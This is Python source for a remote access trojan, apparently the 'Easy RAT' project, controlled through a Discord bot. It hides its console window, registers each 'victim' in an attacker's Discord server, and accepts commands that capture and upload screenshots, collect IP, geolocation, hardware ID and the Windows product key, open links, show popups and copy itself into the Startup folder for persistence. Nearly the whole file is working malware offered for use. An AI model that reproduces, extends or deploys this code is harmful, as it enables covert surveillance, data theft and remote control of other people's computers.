import ctypes
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

import os
import json
import httpx
import shutil
import psutil
import string
import tkinter
import discord
import pyttsx3
import asyncio
import zipfile
import threading
import webbrowser
import subprocess

from sys import argv
from re import findall 
from random import choice
from PIL import ImageGrab
from base64 import b64decode
from tempfile import mkdtemp
from Crypto.Cipher import AES
from datetime import datetime
from discord.commands import Option
from win32crypt import CryptUnprotectData


# change here
bot_token = "BotToken"
guildId = GuildId
ping_on_start = True

# global variables (dont change)
victim = os.getlogin()
roaming = os.getenv("appdata")
victim_pc = os.getenv("COMPUTERNAME")
bot = discord.Bot(debug_guilds=[guildId])
ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
colors = [
    discord.Colour.red(), 
    discord.Colour.orange(), 
    discord.Colour.gold(), 
    discord.Colour.green(),
    discord.Colour.blue(), 
    discord.Colour.purple(),
    discord.Colour.greyple(),
    discord.Colour.brand_green(),
    discord.Colour.brand_red(),
    discord.Colour.dark_blue(),
    discord.Colour.dark_purple(),
    discord.Colour.nitro_pink()
]


#actual code
try:
    directory = roaming + '\\WindowsCache'
    if not os.path.exists(directory):
        os.makedirs(directory)
    print(f"Dev print: folder created at {directory}")
except:
    # directory already exists
    print(f"Dev print: folder already exists at {directory}")

try:
    directory = roaming + '\\WindowsCache\\id cache.txt'
    if not os.path.exists(directory):
        with open(directory, mode="w") as id:
            numbers = string.digits
            upperLetters = string.ascii_uppercase
            bothTypes = numbers + upperLetters
            randomID = ''.join(choice(bothTypes) for i in range(4))
            id.write(f"{victim_pc}-{randomID}")
        id.close()
        print("Dev print: Created id!")
except FileExistsError:
    print(f"Dev print: already has id")

@bot.event
async def on_ready():
    print(f"Dev print: {bot.user} is online")
    directory = roaming + '\\WindowsCache\\id cache.txt'
    idReader = open(directory, "r")
    country = "None"
    req = httpx.get("https://ipinfo.io/json")
    if req.status_code == 200:
        data = req.json()
        country = data.get('country')
    today = datetime.now()
    d2 = today.strftime("%B/%d/%Y %H:%M:%S")
    guild = bot.get_guild(guildId)
    f = await guild.create_text_channel(name=f"Session {victim}", topic=f"PC id: {idReader.read()}")
    idReader = open(directory, "r")

    embed = discord.Embed(
        title=f"New victim {victim}",
        color=choice(colors),
        url="https://github.com/Cryxyemi/Simple-RAT"
    )
    embed.add_field(
        name=f"{victim} | {victim_pc}",
        value=f"""
        Make sure that you setup the webhook using /setup_webhook if you havent yet
        -----------------------------------------
        The id from the computer: {idReader.read()}
        -----------------------------------------
        {victim} executed your program at: {d2}
        -----------------------------------------
        {victim} is from {country}
        """
    )
    embed.set_footer(text="Thank you for choosing Easy RAT")

    if ping_on_start == True:
        await f.send("@everyone")
    embedMessage = await f.send(embed=embed)

@bot.slash_command(description="Makes a popup message on the victims screen")
async def popup_message(ctx, pc_id: str, message: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    print(f"Dev print: message is {message}")
    await ctx.respond("Please wait until the popup window i closed or the program crashes, you get notified by the webhook you set up")
    await ctx.send("Command executed!")
    def func1(evt=None):
        embed = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/766732210953912360/1009168003088273419/unknown.png',
            'embeds': [
                {
                    'author': {
                        'name': f'{victim} closed your popup window',
                        'url': 'https://github.com/Cryxyemi',
                        'icon_url': 'https://cdn.discordapp.com/attachments/766732210953912360/1009166330848624720/unknown.png'
                    },
                    'color': 176185,
                    'description': f'{victim} closed your popup window',
                    'footer': {
                        'text': 'Thank you for choosing Easy RAT'
                    }
                }
            ]
        }
        f = open(roaming + "\\WindowsCache\\web cache.txt", "r")
        httpx.post(f.read(), json=embed)
        rootWindow.destroy()

    rootWindow = tkinter.Tk()
    w = tkinter.Label(rootWindow, text=f"{message}")
    e = tkinter.Button(rootWindow, text="Close", command=func1)
    w.pack()
    e.pack()
    rootWindow.eval('tk::PlaceWindow . center')
    rootWindow.attributes("-topmost", True)
    rootWindow.overrideredirect(True)
    rootWindow.mainloop()

@bot.slash_command(description="simply text to speech")
async def text_to_speech(ctx, pc_id: str, message: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    print(f"Dev print: speaked {message}")
    await ctx.respond("Command executed!")
    engine = pyttsx3.init()
    engine.say(message)
    engine.runAndWait()

@bot.slash_command(description="Takes a screenshot")
async def screenshot(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    dirFile = mkdtemp()
    image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
    image.save(dirFile + "\\Screenshot.png")
    with open(dirFile + '\\Screenshot.png', 'rb') as f:
        picture = discord.File(f)
        await ctx.send(file=picture)
    image.close()
    await ctx.respond("Command executed!")

@bot.slash_command(description="Shows the ip, hardware info and more")
async def pc_info(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
    req = httpx.get("https://ipinfo.io/json")
    if req.status_code == 200:
        data = req.json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        loc = data.get('loc')
        googlemap = "https://www.google.com/maps/search/google+map++" + loc

    try:
        HWID = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
    except Exception:
        HWID = "N/A"
    try:
        wkey = subprocess.check_output(
            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
            creationflags=0x08000000).decode().rstrip()
    except Exception:
        wkey = "N/A"
    try:
        winver = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
                                            creationflags=0x08000000).decode().rstrip()
    except Exception:
        winver = "N/A"
    available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
    
    embed = discord.Embed(
        title=f"Infos from {victim}",
        color=choice(colors),
        url="https://github.com/Cryxyemi/Simple-RAT"
    )

    embed.add_field(
        name="Network infos",
        value=f"""
        -----------------------------------------
        googlemaps: {googlemap}
        ip: {ip}
        city: {city}
        country: {country}
        region: {region}
        org: {org}
        loc: {loc}""",
        inline=False
    )
    embed.add_field(
        name="PC info",
        value=f"""
        -----------------------------------------
        PC Name: {victim_pc}
        HWID: {HWID}
        Windows key: {wkey}
        Windows version: {winver}
        RAM: {ram}GB
        DISK: {disk}GB
        DRIVES = {', '.join(available_drives)}
        """,
        inline=False
    )

    await ctx.respond(embed=embed)
    await ctx.respond("Command executed!")

@bot.slash_command(description="Open a url")
async def open_link(ctx, pc_id: str, link: Option(str, "The link from a website, example: https://www.google.com/")):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    webbrowser.open(link)
    await ctx.respond("Command executed!")

@bot.slash_command(description="Add the rat to the startup folder")
async def add_startup(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy2(argv[0], startup_loc)
    except Exception:
        pass
    await ctx.respond("Command executed!")

@bot.slash_command(description="If your text channel is too messy")
async def clear(ctx, amount: Option(int, "The amount to purge, max 100", min_value=1, max_value=100)):
    messagess = await ctx.channel.purge(limit=amount)
    await ctx.respond(f"Deleted {len (messagess)} messages")

@bot.slash_command(description="setup webhook for commands that requires a webhook")
async def setup_webhook(ctx, pc_id: str, webhook: Option(str, "Your webhook link")):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    directory = roaming + '\\WindowsCache\\'
    try:
        os.remove(directory + '\\web cache.txt')
        print("Removed file")
        await asyncio.sleep(1)
    except:
        print("Could not remove file")
    with open(directory + '\\web cache.txt', mode='w') as f:
        f.write(webhook)
        print("Added file")
        print(f"Dev print: created webhook {directory}")
    f.close()
    await ctx.respond("Command executed!")

@bot.slash_command(description="Set the bot status")
async def set_status(ctx, 
    status_type: Option(str, "The type", choices=["Playing", "Streaming", "Listening", "Watching"]), 
    status_text: Option(str, "The text that should show"), 
    twitch_url: Option(str, "This is required if you choose Streaming", default=None)):
    if status_type == "Playing":
        await bot.change_presence(activity=discord.Game(name=status_text))
    if status_type == "Streaming":
        await bot.change_presence(activity=discord.Streaming(name=status_text, url=twitch_url))
    if status_type == "Listening":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status_text))
    if status_type == "Watching":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status_text))
    await ctx.respond("Command executed!")


if __name__ == "__main__":
    try:
        httpx.get('https://google.com')
    except httpx.ConnectTimeout:
        os._exit(0)
    bot.run(bot_token)
